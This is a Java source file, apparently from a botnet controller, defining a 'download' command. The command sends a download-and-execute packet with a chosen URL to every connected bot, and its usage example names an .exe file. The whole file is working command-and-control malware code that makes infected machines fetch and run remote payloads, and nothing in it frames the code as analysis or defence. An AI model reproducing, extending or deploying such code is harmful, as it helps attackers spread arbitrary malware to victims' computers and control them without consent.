package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class CommandDownload extends Command {

	/**
	 * Downloads and executes a file
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		if (args.length != 1) {
			throw new IllegalArgumentLengthException();
		}
		String url = args[0];

		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_DOWNLOAD_EXECUTE);
				bot.writeString(url);
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "download [URL]";
	}

	@Override
	public String getExample() {
		return "download http://example.com/test.exe";
	}

	@Override
	public String getDescription() {
		return "Downloads and executes a file";
	}
	
}
